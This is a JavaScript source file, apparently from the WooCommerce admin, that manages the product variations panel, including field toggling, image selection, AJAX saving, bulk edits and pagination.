/* global wp, woocommerce_admin_meta_boxes_variations, woocommerce_admin, accounting */
jQuery( function( $ ) {
    'use strict';

	/**
	 * Variations actions
	 */
	var wc_meta_boxes_product_variations_actions = {

		/**
		 * Initialize variations actions
		 */
		init: function() {
			$( '#variable_product_options' )
				.on( 'change', 'input.variable_is_downloadable', this.variable_is_downloadable )
				.on( 'change', 'input.variable_is_virtual', this.variable_is_virtual )
				.on( 'change', 'input.variable_manage_stock', this.variable_manage_stock )
				.on( 'click', 'button.notice-dismiss', this.notice_dismiss )
				.on( 'click', 'h3 .sort', this.set_menu_order )
				.on( 'reload', this.reload );

			$( 'input.variable_is_downloadable, input.variable_is_virtual, input.variable_manage_stock' ).trigger( 'change' );
			$( '#woocommerce-product-data' ).on( 'woocommerce_variations_loaded', this.variations_loaded );
			$( document.body ).on( 'woocommerce_variations_added', this.variation_added );
		},

		/**
		 * Reload UI
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		reload: function() {
			wc_meta_boxes_product_variations_ajax.load_variations( 1 );
			wc_meta_boxes_product_variations_pagenav.set_paginav( 0 );
		},

		/**
		 * Check if variation is downloadable and show/hide elements
		 */
		variable_is_downloadable: function() {
			$( this ).closest( '.woocommerce_variation' ).find( '.show_if_variation_downloadable' ).hide();

			if ( $( this ).is( ':checked' ) ) {
				$( this ).closest( '.woocommerce_variation' ).find( '.show_if_variation_downloadable' ).show();
			}
		},

		/**
		 * Check if variation is virtual and show/hide elements
		 */
		variable_is_virtual: function() {
			$( this ).closest( '.woocommerce_variation' ).find( '.hide_if_variation_virtual' ).show();

			if ( $( this ).is( ':checked' ) ) {
				$( this ).closest( '.woocommerce_variation' ).find( '.hide_if_variation_virtual' ).hide();
			}
		},

		/**
		 * Check if variation manage stock and show/hide elements
		 */
		variable_manage_stock: function() {
			$( this ).closest( '.woocommerce_variation' ).find( '.show_if_variation_manage_stock' ).hide();
			$( this ).closest( '.woocommerce_variation' ).find( '.variable_stock_status' ).show();

			if ( $( this ).is( ':checked' ) ) {
				$( this ).closest( '.woocommerce_variation' ).find( '.show_if_variation_manage_stock' ).show();
				$( this ).closest( '.woocommerce_variation' ).find( '.variable_stock_status' ).hide();
			}

			// Parent level.
			if ( $( 'input#_manage_stock:checked' ).length ) {
				$( this ).closest( '.woocommerce_variation' ).find( '.variable_stock_status' ).hide();
			}
		},

		/**
		 * Notice dismiss
		 */
		notice_dismiss: function() {
			$( this ).closest( 'div.notice' ).remove();
		},

		/**
		 * Run actions when variations is loaded
		 *
		 * @param {Object} event
		 * @param {Int} needsUpdate
		 */
		variations_loaded: function( event, needsUpdate ) {
			needsUpdate = needsUpdate || false;

			var wrapper = $( '#woocommerce-product-data' );

			if ( ! needsUpdate ) {
				// Show/hide downloadable, virtual and stock fields
				$( 'input.variable_is_downloadable, input.variable_is_virtual, input.variable_manage_stock', wrapper ).trigger( 'change' );

				// Open sale schedule fields when have some sale price date
				$( '.woocommerce_variation', wrapper ).each( function( index, el ) {
					var $el       = $( el ),
						date_from = $( '.sale_price_dates_from', $el ).val(),
						date_to   = $( '.sale_price_dates_to', $el ).val();

					if ( '' !== date_from || '' !== date_to ) {
						$( 'a.sale_schedule', $el ).trigger( 'click' );
					}
				});

				// Remove variation-needs-update classes
				$( '.woocommerce_variations .variation-needs-update', wrapper ).removeClass( 'variation-needs-update' );

				// Disable cancel and save buttons
				$( 'button.cancel-variation-changes, button.save-variation-changes', wrapper ).attr( 'disabled', 'disabled' );
			}

			// Init TipTip
			$( '#tiptip_holder' ).removeAttr( 'style' );
			$( '#tiptip_arrow' ).removeAttr( 'style' );
			$( '.woocommerce_variations .tips, .woocommerce_variations .help_tip, .woocommerce_variations .woocommerce-help-tip', wrapper )
				.tipTip({
					'attribute': 'data-tip',
					'fadeIn':    50,
					'fadeOut':   50,
					'delay':     200
			});

			// Datepicker fields
			$( '.sale_price_dates_fields', wrapper ).find( 'input' ).datepicker({
				defaultDate:     '',
				dateFormat:      'yy-mm-dd',
				numberOfMonths:  1,
				showButtonPanel: true,
				onSelect:        function() {
					var option = $( this ).is( '.sale_price_dates_from' ) ? 'minDate' : 'maxDate',
						dates  = $( this ).closest( '.sale_price_dates_fields' ).find( 'input' ),
						date   = $( this ).datepicker( 'getDate' );

					dates.not( this ).datepicker( 'option', option, date );
					$( this ).trigger( 'change' );
				}
			});

			// Allow sorting
			$( '.woocommerce_variations', wrapper ).sortable({
				items:                '.woocommerce_variation',
				cursor:               'move',
				axis:                 'y',
				handle:               '.sort',
				scrollSensitivity:    40,
				forcePlaceholderSize: true,
				helper:               'clone',
				opacity:              0.65,
				stop:                 function() {
				    wc_meta_boxes_product_variations_actions.variation_row_indexes();
				}
			});

			$( document.body ).trigger( 'wc-enhanced-select-init' );
		},

		/**
		 * Run actions when added a variation
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		variation_added: function( event, qty ) {
			if ( 1 === qty ) {
				wc_meta_boxes_product_variations_actions.variations_loaded( null, true );
			}
		},

		/**
		 * Lets the user manually input menu order to move items around pages
		 */
		set_menu_order: function( event ) {
			event.preventDefault();
			var $menu_order  = $( this ).closest( '.woocommerce_variation' ).find( '.variation_menu_order' );
			var variation_id = $( this ).closest( '.woocommerce_variation' ).find( '.variable_post_id' ).val();
			var value        = window.prompt( woocommerce_admin_meta_boxes_variations.i18n_enter_menu_order, $menu_order.val() );

			if ( value != null ) {
				// Set value, save changes and reload view
				$menu_order.val( parseInt( value, 10 ) ).trigger( 'change' );

				$( this ).closest( '.woocommerce_variation' )
					.append( '<input type="hidden" name="new_variation_menu_order_id" value="'
						+ encodeURIComponent( variation_id ) + '" />' );

				$( this ).closest( '.woocommerce_variation' )
					.append( '<input type="hidden" name="new_variation_menu_order_value" value="'
						+ encodeURIComponent( parseInt( value, 10 ) ) + '" />' );

				wc_meta_boxes_product_variations_ajax.save_variations();
			}
		},

		/**
		 * Set menu order
		 */
		variation_row_indexes: function() {
			var wrapper      = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
				current_page = parseInt( wrapper.attr( 'data-page' ), 10 ),
				offset       = parseInt( ( current_page - 1 ) * woocommerce_admin_meta_boxes_variations.variations_per_page, 10 );

			$( '.woocommerce_variations .woocommerce_variation' ).each( function ( index, el ) {
				$( '.variation_menu_order', el )
					.val( parseInt( $( el )
					.index( '.woocommerce_variations .woocommerce_variation' ), 10 ) + 1 + offset )
					.trigger( 'change' );
			});
		}
	};

	/**
	 * Variations media actions
	 */
	var wc_meta_boxes_product_variations_media = {

		/**
		 * wp.media frame object
		 *
		 * @type {Object}
		 */
		variable_image_frame: null,

		/**
		 * Variation image ID
		 *
		 * @type {Int}
		 */
		setting_variation_image_id: null,

		/**
		 * Variation image object
		 *
		 * @type {Object}
		 */
		setting_variation_image: null,

		/**
		 * wp.media post ID
		 *
		 * @type {Int}
		 */
		wp_media_post_id: wp.media.model.settings.post.id,

		/**
		 * Initialize media actions
		 */
		init: function() {
			$( '#variable_product_options' ).on( 'click', '.upload_image_button', this.add_image );
			$( 'a.add_media' ).on( 'click', this.restore_wp_media_post_id );
		},

		/**
		 * Added new image
		 *
		 * @param {Object} event
		 */
		add_image: function( event ) {
			var $button = $( this ),
				post_id = $button.attr( 'rel' ),
				$parent = $button.closest( '.upload_image' );

			wc_meta_boxes_product_variations_media.setting_variation_image    = $parent;
			wc_meta_boxes_product_variations_media.setting_variation_image_id = post_id;

			event.preventDefault();

			if ( $button.is( '.remove' ) ) {

				$( '.upload_image_id', wc_meta_boxes_product_variations_media.setting_variation_image ).val( '' ).trigger( 'change' );
				wc_meta_boxes_product_variations_media.setting_variation_image.find( 'img' ).eq( 0 )
					.attr( 'src', woocommerce_admin_meta_boxes_variations.woocommerce_placeholder_img_src );
				wc_meta_boxes_product_variations_media.setting_variation_image.find( '.upload_image_button' ).removeClass( 'remove' );

			} else {

				// If the media frame already exists, reopen it.
				if ( wc_meta_boxes_product_variations_media.variable_image_frame ) {
					wc_meta_boxes_product_variations_media.variable_image_frame.uploader.uploader
						.param( 'post_id', wc_meta_boxes_product_variations_media.setting_variation_image_id );
					wc_meta_boxes_product_variations_media.variable_image_frame.open();
					return;
				} else {
					wp.media.model.settings.post.id = wc_meta_boxes_product_variations_media.setting_variation_image_id;
				}

				// Create the media frame.
				wc_meta_boxes_product_variations_media.variable_image_frame = wp.media.frames.variable_image = wp.media({
					// Set the title of the modal.
					title: woocommerce_admin_meta_boxes_variations.i18n_choose_image,
					button: {
						text: woocommerce_admin_meta_boxes_variations.i18n_set_image
					},
					states: [
						new wp.media.controller.Library({
							title: woocommerce_admin_meta_boxes_variations.i18n_choose_image,
							filterable: 'all'
						})
					]
				});

				// When an image is selected, run a callback.
				wc_meta_boxes_product_variations_media.variable_image_frame.on( 'select', function () {

					var attachment = wc_meta_boxes_product_variations_media.variable_image_frame.state()
						.get( 'selection' ).first().toJSON(),
						url = attachment.sizes && attachment.sizes.thumbnail ? attachment.sizes.thumbnail.url : attachment.url;

					$( '.upload_image_id', wc_meta_boxes_product_variations_media.setting_variation_image ).val( attachment.id )
						.trigger( 'change' );
					wc_meta_boxes_product_variations_media.setting_variation_image.find( '.upload_image_button' ).addClass( 'remove' );
					wc_meta_boxes_product_variations_media.setting_variation_image.find( 'img' ).eq( 0 ).attr( 'src', url );

					wp.media.model.settings.post.id = wc_meta_boxes_product_variations_media.wp_media_post_id;
				});

				// Finally, open the modal.
				wc_meta_boxes_product_variations_media.variable_image_frame.open();
			}
		},

		/**
		 * Restore wp.media post ID.
		 */
		restore_wp_media_post_id: function() {
			wp.media.model.settings.post.id = wc_meta_boxes_product_variations_media.wp_media_post_id;
		}
	};

	/**
	 * Product variations metabox ajax methods
	 */
	var wc_meta_boxes_product_variations_ajax = {

		/**
		 * Initialize variations ajax methods
		 */
		init: function() {
			$( 'li.variations_tab a' ).on( 'click', this.initial_load );

			$( '#variable_product_options' )
				.on( 'click', 'button.save-variation-changes', this.save_variations )
				.on( 'click', 'button.cancel-variation-changes', this.cancel_variations )
				.on( 'click', '.remove_variation', this.remove_variation )
				.on( 'click','.downloadable_files a.delete', this.input_changed );

			$( document.body )
				.on( 'change', '#variable_product_options .woocommerce_variations :input', this.input_changed )
				.on( 'change', '.variations-defaults select', this.defaults_changed );

			var postForm = $( 'form#post' );

			postForm.on( 'submit', this.save_on_submit );

			$( 'input:submit', postForm ).on( 'click keypress', function() {
				postForm.data( 'callerid', this.id );
			});

			$( '.wc-metaboxes-wrapper' ).on( 'click', 'a.do_variation_action', this.do_variation_action );
		},

		/**
		 * Check if have some changes before leave the page
		 *
		 * @return {Bool}
		 */
		check_for_changes: function() {
			var need_update = $( '#variable_product_options' ).find( '.woocommerce_variations .variation-needs-update' );

			if ( 0 < need_update.length ) {
				if ( window.confirm( woocommerce_admin_meta_boxes_variations.i18n_edited_variations ) ) {
					wc_meta_boxes_product_variations_ajax.save_changes();
				} else {
					need_update.removeClass( 'variation-needs-update' );
					return false;
				}
			}

			return true;
		},

		/**
		 * Block edit screen
		 */
		block: function() {
			$( '#woocommerce-product-data' ).block({
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			});
		},

		/**
		 * Unblock edit screen
		 */
		unblock: function() {
			$( '#woocommerce-product-data' ).unblock();
		},

		/**
		 * Initial load variations
		 *
		 * @return {Bool}
		 */
		initial_load: function() {
			if ( 0 === $( '#variable_product_options' ).find( '.woocommerce_variations .woocommerce_variation' ).length ) {
				wc_meta_boxes_product_variations_pagenav.go_to_page();
			}
		},

		/**
		 * Load variations via Ajax
		 *
		 * @param {Int} page (default: 1)
		 * @param {Int} per_page (default: 10)
		 */
		load_variations: function( page, per_page ) {
			page     = page || 1;
			per_page = per_page || woocommerce_admin_meta_boxes_variations.variations_per_page;

			var wrapper = $( '#variable_product_options' ).find( '.woocommerce_variations' );

			wc_meta_boxes_product_variations_ajax.block();

			$.ajax({
				url: woocommerce_admin_meta_boxes_variations.ajax_url,
				data: {
					action:     'woocommerce_load_variations',
					security:   woocommerce_admin_meta_boxes_variations.load_variations_nonce,
					product_id: woocommerce_admin_meta_boxes_variations.post_id,
					attributes: wrapper.data( 'attributes' ),
					page:       page,
					per_page:   per_page
				},
				type: 'POST',
				success: function( response ) {
					wrapper.empty().append( response ).attr( 'data-page', page );

					$( '#woocommerce-product-data' ).trigger( 'woocommerce_variations_loaded' );

					wc_meta_boxes_product_variations_ajax.unblock();
				}
			});
		},

		/**
		 * Ger variations fields and convert to object
		 *
		 * @param  {Object} fields
		 *
		 * @return {Object}
		 */
		get_variations_fields: function( fields ) {
			var data = $( ':input', fields ).serializeJSON();

			$( '.variations-defaults select' ).each( function( index, element ) {
				var select = $( element );
				data[ select.attr( 'name' ) ] = select.val();
			});

			return data;
		},

		/**
		 * Save variations changes
		 *
		 * @param {Function} callback Called once saving is complete
		 */
		save_changes: function( callback ) {
			var wrapper     = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
				need_update = $( '.variation-needs-update', wrapper ),
				data        = {};

			// Save only with products need update.
			if ( 0 < need_update.length ) {
				wc_meta_boxes_product_variations_ajax.block();

				data                 = wc_meta_boxes_product_variations_ajax.get_variations_fields( need_update );
				data.action          = 'woocommerce_save_variations';
				data.security        = woocommerce_admin_meta_boxes_variations.save_variations_nonce;
				data.product_id      = woocommerce_admin_meta_boxes_variations.post_id;
				data['product-type'] = $( '#product-type' ).val();

				$.ajax({
					url: woocommerce_admin_meta_boxes_variations.ajax_url,
					data: data,
					type: 'POST',
					success: function( response ) {
						// Allow change page, delete and add new variations
						need_update.removeClass( 'variation-needs-update' );
						$( 'button.cancel-variation-changes, button.save-variation-changes' ).attr( 'disabled', 'disabled' );

						$( '#woocommerce-product-data' ).trigger( 'woocommerce_variations_saved' );

						if ( typeof callback === 'function' ) {
							callback( response );
						}

						wc_meta_boxes_product_variations_ajax.unblock();
					}
				});
			}
		},

		/**
		 * Save variations
		 *
		 * @return {Bool}
		 */
		save_variations: function() {
			$( '#variable_product_options' ).trigger( 'woocommerce_variations_save_variations_button' );

			wc_meta_boxes_product_variations_ajax.save_changes( function( error ) {
				var wrapper = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
					current = wrapper.attr( 'data-page' );

				$( '#variable_product_options' ).find( '#woocommerce_errors' ).remove();

				if ( error ) {
					wrapper.before( error );
				}

				$( '.variations-defaults select' ).each( function() {
					$( this ).attr( 'data-current', $( this ).val() );
				});

				wc_meta_boxes_product_variations_pagenav.go_to_page( current );
			});

			return false;
		},

		/**
		 * Save on post form submit
		 */
		save_on_submit: function( e ) {
			var need_update = $( '#variable_product_options' ).find( '.woocommerce_variations .variation-needs-update' );

			if ( 0 < need_update.length ) {
				e.preventDefault();
				$( '#variable_product_options' ).trigger( 'woocommerce_variations_save_variations_on_submit' );
				wc_meta_boxes_product_variations_ajax.save_changes( wc_meta_boxes_product_variations_ajax.save_on_submit_done );
			}
		},

		/**
		 * After saved, continue with form submission
		 */
		save_on_submit_done: function() {
			var postForm = $( 'form#post' ),
				callerid = postForm.data( 'callerid' );

			if ( 'publish' === callerid ) {
				postForm.append('<input type="hidden" name="publish" value="1" />').trigger( 'submit' );
			} else {
				postForm.append('<input type="hidden" name="save-post" value="1" />').trigger( 'submit' );
			}
		},

		/**
		 * Discart changes.
		 *
		 * @return {Bool}
		 */
		cancel_variations: function() {
			var current = parseInt( $( '#variable_product_options' ).find( '.woocommerce_variations' ).attr( 'data-page' ), 10 );

			$( '#variable_product_options' ).find( '.woocommerce_variations .variation-needs-update' )
				.removeClass( 'variation-needs-update' );
			$( '.variations-defaults select' ).each( function() {
				$( this ).val( $( this ).attr( 'data-current' ) );
			});

			wc_meta_boxes_product_variations_pagenav.go_to_page( current );

			return false;
		},

		/**
		 * Add variation
		 *
		 * @return {Bool}
		 */
		add_variation: function() {
			wc_meta_boxes_product_variations_ajax.block();

			var data = {
				action: 'woocommerce_add_variation',
				post_id: woocommerce_admin_meta_boxes_variations.post_id,
				loop: $( '.woocommerce_variation' ).length,
				security: woocommerce_admin_meta_boxes_variations.add_variation_nonce
			};

			$.post( woocommerce_admin_meta_boxes_variations.ajax_url, data, function( response ) {
				var variation = $( response );
				variation.addClass( 'variation-needs-update' );

				$( '.woocommerce-notice-invalid-variation' ).remove();
				$( '#variable_product_options' ).find( '.woocommerce_variations' ).prepend( variation );
				$( 'button.cancel-variation-changes, button.save-variation-changes' ).prop( 'disabled', false );
				$( '#variable_product_options' ).trigger( 'woocommerce_variations_added', 1 );
				wc_meta_boxes_product_variations_ajax.unblock();
			});

			return false;
		},

		/**
		 * Remove variation
		 *
		 * @return {Bool}
		 */
		remove_variation: function() {
			wc_meta_boxes_product_variations_ajax.check_for_changes();

			if ( window.confirm( woocommerce_admin_meta_boxes_variations.i18n_remove_variation ) ) {
				var variation     = $( this ).attr( 'rel' ),
					variation_ids = [],
					data          = {
						action: 'woocommerce_remove_variations'
					};

				wc_meta_boxes_product_variations_ajax.block();

				if ( 0 < variation ) {
					variation_ids.push( variation );

					data.variation_ids = variation_ids;
					data.security      = woocommerce_admin_meta_boxes_variations.delete_variations_nonce;

					$.post( woocommerce_admin_meta_boxes_variations.ajax_url, data, function() {
						var wrapper      = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
							current_page = parseInt( wrapper.attr( 'data-page' ), 10 ),
							total_pages  = Math.ceil( (
								parseInt( wrapper.attr( 'data-total' ), 10 ) - 1
							) / woocommerce_admin_meta_boxes_variations.variations_per_page ),
							page         = 1;

						$( '#woocommerce-product-data' ).trigger( 'woocommerce_variations_removed' );

						if ( current_page === total_pages || current_page <= total_pages ) {
							page = current_page;
						} else if ( current_page > total_pages && 0 !== total_pages ) {
							page = total_pages;
						}

						wc_meta_boxes_product_variations_pagenav.go_to_page( page, -1 );
					});

				} else {
					wc_meta_boxes_product_variations_ajax.unblock();
				}
			}

			return false;
		},

		/**
		 * Link all variations (or at least try :p)
		 *
		 * @return {Bool}
		 */
		link_all_variations: function() {
			wc_meta_boxes_product_variations_ajax.check_for_changes();

			if ( window.confirm( woocommerce_admin_meta_boxes_variations.i18n_link_all_variations ) ) {
				wc_meta_boxes_product_variations_ajax.block();

				var data = {
					action: 'woocommerce_link_all_variations',
					post_id: woocommerce_admin_meta_boxes_variations.post_id,
					security: woocommerce_admin_meta_boxes_variations.link_variation_nonce
				};

				$.post( woocommerce_admin_meta_boxes_variations.ajax_url, data, function( response ) {
					var count = parseInt( response, 10 );

					if ( 1 === count ) {
						window.alert( count + ' ' + woocommerce_admin_meta_boxes_variations.i18n_variation_added );
					} else if ( 0 === count || count > 1 ) {
						window.alert( count + ' ' + woocommerce_admin_meta_boxes_variations.i18n_variations_added );
					} else {
						window.alert( woocommerce_admin_meta_boxes_variations.i18n_no_variations_added );
					}

					if ( count > 0 ) {
						wc_meta_boxes_product_variations_pagenav.go_to_page( 1, count );
						$( '#variable_product_options' ).trigger( 'woocommerce_variations_added', count );
					} else {
						wc_meta_boxes_product_variations_ajax.unblock();
					}
				});
			}

			return false;
		},

		/**
		 * Add new class when have changes in some input
		 */
		input_changed: function() {
			$( this )
				.closest( '.woocommerce_variation' )
				.addClass( 'variation-needs-update' );

			$( 'button.cancel-variation-changes, button.save-variation-changes' ).prop( 'disabled', false );

			$( '#variable_product_options' ).trigger( 'woocommerce_variations_input_changed' );
		},

		/**
		 * Added new .variation-needs-update class when defaults is changed
		 */
		defaults_changed: function() {
			$( this )
				.closest( '#variable_product_options' )
				.find( '.woocommerce_variation:first' )
				.addClass( 'variation-needs-update' );

			$( 'button.cancel-variation-changes, button.save-variation-changes' ).prop( 'disabled', false );

			$( '#variable_product_options' ).trigger( 'woocommerce_variations_defaults_changed' );
		},

		/**
		 * Actions
		 */
		do_variation_action: function() {
			var do_variation_action = $( 'select.variation_actions' ).val(),
				data       = {},
				changes    = 0,
				value;

			switch ( do_variation_action ) {
				case 'add_variation' :
					wc_meta_boxes_product_variations_ajax.add_variation();
					return;
				case 'link_all_variations' :
					wc_meta_boxes_product_variations_ajax.link_all_variations();
					return;
				case 'delete_all' :
					if ( window.confirm( woocommerce_admin_meta_boxes_variations.i18n_delete_all_variations ) ) {
						if ( window.confirm( woocommerce_admin_meta_boxes_variations.i18n_last_warning ) ) {
							data.allowed = true;
							changes      = parseInt( $( '#variable_product_options' ).find( '.woocommerce_variations' )
								.attr( 'data-total' ), 10 ) * -1;
						}
					}
					break;
				case 'variable_regular_price_increase' :
				case 'variable_regular_price_decrease' :
				case 'variable_sale_price_increase' :
				case 'variable_sale_price_decrease' :
					value = window.prompt( woocommerce_admin_meta_boxes_variations.i18n_enter_a_value_fixed_or_percent );

					if ( value != null ) {
						if ( value.indexOf( '%' ) >= 0 ) {
							data.value = accounting.unformat( value.replace( /\%/, '' ), woocommerce_admin.mon_decimal_point ) + '%';
						} else {
							data.value = accounting.unformat( value, woocommerce_admin.mon_decimal_point );
						}
					} else {
						return;
					}
					break;
				case 'variable_regular_price' :
				case 'variable_sale_price' :
				case 'variable_stock' :
				case 'variable_low_stock_amount' :
				case 'variable_weight' :
				case 'variable_length' :
				case 'variable_width' :
				case 'variable_height' :
				case 'variable_download_limit' :
				case 'variable_download_expiry' :
					value = window.prompt( woocommerce_admin_meta_boxes_variations.i18n_enter_a_value );

					if ( value != null ) {
						data.value = value;
					} else {
						return;
					}
					break;
				case 'variable_sale_schedule' :
					data.date_from = window.prompt( woocommerce_admin_meta_boxes_variations.i18n_scheduled_sale_start );
					data.date_to   = window.prompt( woocommerce_admin_meta_boxes_variations.i18n_scheduled_sale_end );

					if ( null === data.date_from ) {
						data.date_from = false;
					}

					if ( null === data.date_to ) {
						data.date_to = false;
					}

					if ( false === data.date_to && false === data.date_from ) {
						return;
					}
					break;
				default :
					$( 'select.variation_actions' ).trigger( do_variation_action );
					data = $( 'select.variation_actions' ).triggerHandler( do_variation_action + '_ajax_data', data );
					
					if ( null === data ) {
						return;
					}
					break;
			}

			if ( 'delete_all' === do_variation_action && data.allowed ) {
				$( '#variable_product_options' ).find( '.variation-needs-update' ).removeClass( 'variation-needs-update' );
			} else {
				wc_meta_boxes_product_variations_ajax.check_for_changes();
			}

			wc_meta_boxes_product_variations_ajax.block();

			$.ajax({
				url: woocommerce_admin_meta_boxes_variations.ajax_url,
				data: {
					action:       'woocommerce_bulk_edit_variations',
					security:     woocommerce_admin_meta_boxes_variations.bulk_edit_variations_nonce,
					product_id:   woocommerce_admin_meta_boxes_variations.post_id,
					product_type: $( '#product-type' ).val(),
					bulk_action:  do_variation_action,
					data:         data
				},
				type: 'POST',
				success: function() {
					wc_meta_boxes_product_variations_pagenav.go_to_page( 1, changes );
				}
			});
		}
	};

	/**
	 * Product variations pagenav
	 */
	var wc_meta_boxes_product_variations_pagenav = {

		/**
		 * Initialize products variations meta box
		 */
		init: function() {
			$( document.body )
				.on( 'woocommerce_variations_added', this.update_single_quantity )
				.on( 'change', '.variations-pagenav .page-selector', this.page_selector )
				.on( 'click', '.variations-pagenav .first-page', this.first_page )
				.on( 'click', '.variations-pagenav .prev-page', this.prev_page )
				.on( 'click', '.variations-pagenav .next-page', this.next_page )
				.on( 'click', '.variations-pagenav .last-page', this.last_page );
		},

		/**
		 * Set variations count
		 *
		 * @param {Int} qty
		 *
		 * @return {Int}
		 */
		update_variations_count: function( qty ) {
			var wrapper        = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
				total          = parseInt( wrapper.attr( 'data-total' ), 10 ) + qty,
				displaying_num = $( '.variations-pagenav .displaying-num' );

			// Set the new total of variations
			wrapper.attr( 'data-total', total );

			if ( 1 === total ) {
				displaying_num.text( woocommerce_admin_meta_boxes_variations.i18n_variation_count_single.replace( '%qty%', total ) );
			} else {
				displaying_num.text( woocommerce_admin_meta_boxes_variations.i18n_variation_count_plural.replace( '%qty%', total ) );
			}

			return total;
		},

		/**
		 * Update variations quantity when add a new variation
		 *
		 * @param {Object} event
		 * @param {Int} qty
		 */
		update_single_quantity: function( event, qty ) {
			if ( 1 === qty ) {
				var page_nav = $( '.variations-pagenav' );

				wc_meta_boxes_product_variations_pagenav.update_variations_count( qty );

				if ( page_nav.is( ':hidden' ) ) {
					$( 'option, optgroup', '.variation_actions' ).show();
					$( '.variation_actions' ).val( 'add_variation' );
					$( '#variable_product_options' ).find( '.toolbar' ).show();
					page_nav.show();
					$( '.pagination-links', page_nav ).hide();
				}
			}
		},

		/**
		 * Set the pagenav fields
		 *
		 * @param {Int} qty
		 */
		set_paginav: function( qty ) {
			var wrapper          = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
				new_qty          = wc_meta_boxes_product_variations_pagenav.update_variations_count( qty ),
				toolbar          = $( '#variable_product_options' ).find( '.toolbar' ),
				variation_action = $( '.variation_actions' ),
				page_nav         = $( '.variations-pagenav' ),
				displaying_links = $( '.pagination-links', page_nav ),
				total_pages      = Math.ceil( new_qty / woocommerce_admin_meta_boxes_variations.variations_per_page ),
				options          = '';

			// Set the new total of pages
			wrapper.attr( 'data-total_pages', total_pages );

			$( '.total-pages', page_nav ).text( total_pages );

			// Set the new pagenav options
			for ( var i = 1; i <= total_pages; i++ ) {
				options += '<option value="' + i + '">' + i + '</option>';
			}

			$( '.page-selector', page_nav ).empty().html( options );

			// Show/hide pagenav
			if ( 0 === new_qty ) {
				toolbar.not( '.toolbar-top, .toolbar-buttons' ).hide();
				page_nav.hide();
				$( 'option, optgroup', variation_action ).hide();
				$( '.variation_actions' ).val( 'add_variation' );
				$( 'option[data-global="true"]', variation_action ).show();

			} else {
				toolbar.show();
				page_nav.show();
				$( 'option, optgroup', variation_action ).show();
				$( '.variation_actions' ).val( 'add_variation' );

				// Show/hide links
				if ( 1 === total_pages ) {
					displaying_links.hide();
				} else {
					displaying_links.show();
				}
			}
		},

		/**
		 * Check button if enabled and if don't have changes
		 *
		 * @return {Bool}
		 */
		check_is_enabled: function( current ) {
			return ! $( current ).hasClass( 'disabled' );
		},

		/**
		 * Change "disabled" class on pagenav
		 */
		change_classes: function( selected, total ) {
			var first_page = $( '.variations-pagenav .first-page' ),
				prev_page  = $( '.variations-pagenav .prev-page' ),
				next_page  = $( '.variations-pagenav .next-page' ),
				last_page  = $( '.variations-pagenav .last-page' );

			if ( 1 === selected ) {
				first_page.addClass( 'disabled' );
				prev_page.addClass( 'disabled' );
			} else {
				first_page.removeClass( 'disabled' );
				prev_page.removeClass( 'disabled' );
			}

			if ( total === selected ) {
				next_page.addClass( 'disabled' );
				last_page.addClass( 'disabled' );
			} else {
				next_page.removeClass( 'disabled' );
				last_page.removeClass( 'disabled' );
			}
		},

		/**
		 * Set page
		 */
		set_page: function( page ) {
			$( '.variations-pagenav .page-selector' ).val( page ).first().trigger( 'change' );
		},

		/**
		 * Navigate on variations pages
		 *
		 * @param {Int} page
		 * @param {Int} qty
		 */
		go_to_page: function( page, qty ) {
			page = page || 1;
			qty  = qty || 0;

			wc_meta_boxes_product_variations_pagenav.set_paginav( qty );
			wc_meta_boxes_product_variations_pagenav.set_page( page );
		},

		/**
		 * Paginav pagination selector
		 */
		page_selector: function() {
			var selected = parseInt( $( this ).val(), 10 ),
				wrapper  = $( '#variable_product_options' ).find( '.woocommerce_variations' );

			$( '.variations-pagenav .page-selector' ).val( selected );

			wc_meta_boxes_product_variations_ajax.check_for_changes();
			wc_meta_boxes_product_variations_pagenav.change_classes( selected, parseInt( wrapper.attr( 'data-total_pages' ), 10 ) );
			wc_meta_boxes_product_variations_ajax.load_variations( selected );
		},

		/**
		 * Go to first page
		 *
		 * @return {Bool}
		 */
		first_page: function() {
			if ( wc_meta_boxes_product_variations_pagenav.check_is_enabled( this ) ) {
				wc_meta_boxes_product_variations_pagenav.set_page( 1 );
			}

			return false;
		},

		/**
		 * Go to previous page
		 *
		 * @return {Bool}
		 */
		prev_page: function() {
			if ( wc_meta_boxes_product_variations_pagenav.check_is_enabled( this ) ) {
				var wrapper   = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
					prev_page = parseInt( wrapper.attr( 'data-page' ), 10 ) - 1,
					new_page  = ( 0 < prev_page ) ? prev_page : 1;

				wc_meta_boxes_product_variations_pagenav.set_page( new_page );
			}

			return false;
		},

		/**
		 * Go to next page
		 *
		 * @return {Bool}
		 */
		next_page: function() {
			if ( wc_meta_boxes_product_variations_pagenav.check_is_enabled( this ) ) {
				var wrapper     = $( '#variable_product_options' ).find( '.woocommerce_variations' ),
					total_pages = parseInt( wrapper.attr( 'data-total_pages' ), 10 ),
					next_page   = parseInt( wrapper.attr( 'data-page' ), 10 ) + 1,
					new_page    = ( total_pages >= next_page ) ? next_page : total_pages;

				wc_meta_boxes_product_variations_pagenav.set_page( new_page );
			}

			return false;
		},

		/**
		 * Go to last page
		 *
		 * @return {Bool}
		 */
		last_page: function() {
			if ( wc_meta_boxes_product_variations_pagenav.check_is_enabled( this ) ) {
				var last_page = $( '#variable_product_options' ).find( '.woocommerce_variations' ).attr( 'data-total_pages' );

				wc_meta_boxes_product_variations_pagenav.set_page( last_page );
			}

			return false;
		}
	};

	wc_meta_boxes_product_variations_actions.init();
	wc_meta_boxes_product_variations_media.init();
	wc_meta_boxes_product_variations_ajax.init();
	wc_meta_boxes_product_variations_pagenav.init();

});

